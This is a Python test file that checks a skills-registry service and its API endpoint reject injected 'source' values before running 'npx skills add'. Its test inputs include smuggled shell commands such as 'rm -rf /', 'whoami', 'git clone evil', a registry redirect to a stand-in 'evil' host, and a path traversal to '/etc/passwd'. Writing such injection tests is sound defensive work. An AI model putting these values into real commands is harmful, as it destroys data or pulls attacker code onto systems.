"""Tests for SkillsRegistryService — source validation on install.

Regression for command-line injection via unvalidated `source` passed straight
into `npx -y skills add <source>`. The fix lives in the service (raises
``InvalidSkillSourceError``) and the API endpoint (translates that to HTTP 400).

Reference: docs/cockpit/security-scanning-decision.md §2.1 row 4.
"""
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.services.skills_registry_service import (
    InvalidSkillSourceError,
    SkillsRegistryService,
)

client = TestClient(app)


def test_install_skill_rejects_injection_in_source():
    """`source` carrying a shell-injection payload must be rejected pre-subprocess."""
    with patch(
        "app.services.skills_registry_service.subprocess.run"
    ) as mock_run:
        with pytest.raises(InvalidSkillSourceError):
            SkillsRegistryService.install_skill(
                source="vercel/foo --registry=http://evil",
            )
    assert not mock_run.called, "subprocess.run must NOT be invoked on invalid source"


def test_install_skill_accepts_valid_source():
    """A canonical `org/repo` source passes validation and reaches the subprocess."""
    fake_result = type("R", (), {"returncode": 0, "stdout": "ok", "stderr": ""})()
    with patch(
        "app.services.skills_registry_service.subprocess.run", return_value=fake_result
    ) as mock_run:
        result = SkillsRegistryService.install_skill(
            source="vercel-labs/agent-skills",
        )
    assert result["success"] is True
    assert mock_run.called, "subprocess.run must be invoked for a valid source"


@pytest.mark.parametrize(
    "bad_source",
    [
        "",
        "no-slash",
        "--registry=http://evil",
        "vercel/foo;rm -rf /",
        "../etc/passwd",
        "vercel/foo\ngit clone evil",
        "vercel/foo&whoami",
    ],
)
def test_install_skill_rejects_malformed_sources(bad_source):
    """The regex must reject empty strings, missing slashes, leading dashes, control chars and shell metachars."""
    with patch(
        "app.services.skills_registry_service.subprocess.run"
    ) as mock_run:
        with pytest.raises(InvalidSkillSourceError):
            SkillsRegistryService.install_skill(source=bad_source)
    assert not mock_run.called


def test_install_endpoint_returns_400_on_injection():
    """HTTP layer translates ``InvalidSkillSourceError`` into a 400 with an informative message."""
    with patch(
        "app.services.skills_registry_service.subprocess.run"
    ) as mock_run:
        response = client.post(
            "/api/v1/agents/skills/registry/install",
            json={"source": "vercel/foo --registry=http://evil"},
        )
    assert response.status_code == 400, response.text
    assert "source" in response.json()["detail"].lower()
    assert not mock_run.called


def test_install_endpoint_accepts_valid_source():
    """Happy path on the HTTP layer — valid source reaches the subprocess and yields success."""
    fake_result = type("R", (), {"returncode": 0, "stdout": "ok", "stderr": ""})()
    with patch(
        "app.services.skills_registry_service.subprocess.run", return_value=fake_result
    ):
        response = client.post(
            "/api/v1/agents/skills/registry/install",
            json={"source": "vercel-labs/agent-skills"},
        )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["success"] is True
    assert body["source"] == "vercel-labs/agent-skills"